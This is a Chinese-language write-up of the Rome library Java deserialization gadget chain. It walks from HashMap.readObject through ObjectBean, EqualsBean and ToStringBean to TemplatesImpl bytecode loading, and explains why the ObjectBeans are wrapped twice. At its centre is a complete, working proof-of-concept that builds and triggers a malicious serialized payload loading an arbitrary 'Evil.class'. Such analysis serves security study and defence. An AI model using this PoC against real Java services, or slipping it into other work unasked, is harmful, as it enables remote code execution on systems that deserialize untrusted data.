## 一，rome 概览
Rome 是一个用于 RSS/Atom Feed 解析与生成 的 Java 库，其作用是将不同格式的 Feed（RSS、Atom 等）统一抽象成 Java 对象，方便开发者进行读取、修改和生成。

## 二，关键类介绍
**ObjectBean**

为了统一 JavaBean 的通用行为（如 `equals()`、`hashCode()`、`toString()` 等）的实现，Rome 设计了 ObjectBean 作为一个通用包装器（Wrapper）。ObjectBean 内部维护了两个核心字段：

+ `_beanClass`：表示被包装对象所属的类型； 
+ `_obj`：表示真正被包装的对象。 

ObjectBean 本身几乎不实现具体逻辑，而是将 `equals()`、`hashCode()`、`toString()` 等方法分别委托给内部的 EqualsBean、ToStringBean 等辅助类完成。在 Rome-01 Gadget 中，正是这种"包装器 + 委托"的设计，使得普通对象能够通过一系列方法调用最终进入危险的反射调用流程，因此 EqualsBean 和 ToStringBean 是本条利用链需要重点分析的两个核心类。

## 三，链子总览
HashMap.readObject()

ObjectBean.hashCode()

_equalsBean.hashCode()

<font style="color:#080808;background-color:#ffffff;">beanHashCode()</font>

<font style="color:#080808;background-color:#ffffff;">_obj.toString().hashCode()</font>

<font style="color:#080808;background-color:#ffffff;">_toStringBean.toString()</font>

<font style="color:#080808;background-color:#ffffff;">getTransletInstance().invoke(_obj,NO_PARAMS)</font>

## 四，Poc
```plain
public class App {
    public static void main(String[] args) throws Exception {
        byte[] evilBytes = Files.readAllBytes(Paths.get("Evil.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{evilBytes});
        setField(templates, "_name", "Evil");
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        ObjectBean delegate = new ObjectBean(Templates.class, templates);
        ObjectBean root = new ObjectBean(ObjectBean.class, delegate);

        HashMap map = new HashMap();
        map.put("test", 1);

        Field tableField = map.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(map);
        for (Object node : table) {
            if (node != null) {
                Field keyField = node.getClass().getDeclaredField("key");
                keyField.setAccessible(true);
                keyField.set(node, root);
                break;
            }
        }

        System.out.println("=== serializing ===");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("rome.ser"));
        oos.writeObject(map);
        oos.close();

        System.out.println("=== deserializing ===");
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("rome.ser"));
        ois.readObject();
        ois.close();
    }

    private static void setField(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

整个链子主要利用 EquaslBean 的 <font style="color:#080808;background-color:#ffffff;">beanHashCode()方法</font>和 ToStringBean 的 toString()方法来充当 gadget，反序列化时触发 HashMap 的 readObject 方法，从而触发内部元素的 equals 方法，而 ObjectBean 的 hashCode 方法又会转发给 内部的 EqualsBean 类，进而进入到 _beanHashCode()，

<!-- 这是一张图片，ocr 内容为：PUBLIC INT HASHCODE() { RETURN BEANHASHCODE(); RETURNS THE HASHCODE FOR THE OBJECT PASSED IN THE CONSTRUCTOR. IT FOLLOWS THE CONTRACT DEFINED BY THE OBJECT HASHCODEO METHOD. THE HASHCODE IS CALCULATED BY GETTING THE HASHCODE OF THE BEAN STRING REPRESENTATION. TO BE USED BY CLASSES USING EQUALSBEAN IN A DELEGATION PATTERN, 返回值: THE HASHCODE OF THE BEAN OBJECT. 请参阅:CONSTRUCTOR. BEANHASHCODE() { PUBLIC INT _OBJ.TOSTRING().HASHCODE(); RETURN 了 -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785159062732-4394d569-6774-4427-9bda-4313de7431af.png)

而在 _beanHashCode 方法中又会调用 toString 方法，从而又进入到 ToStringBean 中的 toString 方法

<!-- 这是一张图片，ocr 内容为：PRIVATE STRING TOSTRING(STRING PREFIX) { STRINGBUFFER SB - NEW STRINGBUFFER( CAPACITY:128); TRY PROPERTYDESCRIPTOR[] PDS - BEANINTROSPECTOR GETPROPERTYDESCRIPTORS(_BEANCLASS); IF (PDS!-NULL){ FOR (INT I-0;I<PDS.LENGTH;I++) { STRING PNAME - PDS[I].GETNAME(); METHOD PREADMETHOD - PDS[I].GETREADMETHOD(); IF (PREADMETHOD!NULL&& // ENSURE IT HAS A GETTER METHOD SS && PREADMETHOD.GETDECLARINGCLASS()!-OBJECT.CLASS  & // FILTER OBJECT.CLASS GETTER METHODS PREADMETHOD.GETPARAMETERTYPES().LENGTH--0) { // FILTER GETTER METHODS THAT TAKE PARAMETERS PREADMETHOD.INVOKE(_OBJ,NO_PARAMS); OBJECT VALUE PRINTPROPERTY(SB, PREFIX:PREFIX+"."+PNAME,VALUE); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785159205222-a58db1d1-73e8-42ac-8e5c-722fb777177e.png)

ToStringBean 类中的 ToString 方法非常关键，查看其源码可以发现，该方法会循环获取 _obj 类的 get 方法，并反射调用，自动调用 get 方法可以想到老朋友 TemplatesImpl，该类存在一个<font style="color:#080808;background-color:#ffffff;">getTransletInstance 方法，可以加载任意字节码，进入 sink，触发恶意类加载</font>

<font style="color:#080808;background-color:#ffffff;">在这期间值得注意的是我们在构建塞入 HashMap 中的 ObjectBean 元素时采取了嵌套构造的方法，一个 ObjecBean 中又嵌套了一个 ObjectBean 类，为什么要这样做？</font>

<!-- 这是一张图片，ocr 内容为：FIELDNAME:"_TFACTORY", NEW TRANSFORMERFACTORYIMPL()); SETFIELD(TEMPLATES, OBJECTBEAN(TEMPLATES.CLASS, TEMPLATES); OBJECTBEAN INNER NEW OBJECTBEAN(OBJECTBEAN.CLASS, INNER); OBJECTBEAN NEW OUTTER HASHMAP(); HASHMAP MAP NEW 1); TEST MAP.PUT -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785160686343-37ec7940-db1e-4f0d-9a20-208743dbfe91.png)

重点在于 EqualsBean 的 beanHashCode 方法中

<!-- 这是一张图片，ocr 内容为：返回值:THE HASHCODE OF THE BEAN OBJECT. 请参阅:CONSTRUCTOR. PUBLIC INT BEANHASHCODE() { _OBJ.TOSTRING().HASHCODE(); RETURN -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785160578224-05a8e789-4b80-43ce-b13d-0ce407da13db.png)

我们是利用 _obj.toString()进入到 ToStringBean 的 toString 方法中才触发最终的反射调用，而 _obj 就是我们传入 ObjectBean 中的初始类，如果这里只用一个 ObjectBean 包装：<font style="color:#080808;background-color:#ffffff;">ObjectBean inner = new ObjectBean(Templates.class, templates);</font>

<font style="color:#080808;background-color:#ffffff;">那么 _obj 就是 templates，那调用就走进了 templates.toString 方法，显然这个 toString 方法并不是我们想要的，我们需要一个能自动调用类 get 方法的方法</font>

<font style="color:#080808;background-color:#ffffff;">所以我们需要对其进行双重包装，最终：</font>

<font style="color:#080808;background-color:#ffffff;">HashMap</font>

<font style="color:#080808;background-color:#ffffff;">->outter  ObjectBean(ObjectBean,inner)</font>

<font style="color:#080808;background-color:#ffffff;">->inner ObjectBean(Templates.class，templates)</font>

<font style="color:#080808;background-color:#ffffff;"></font>







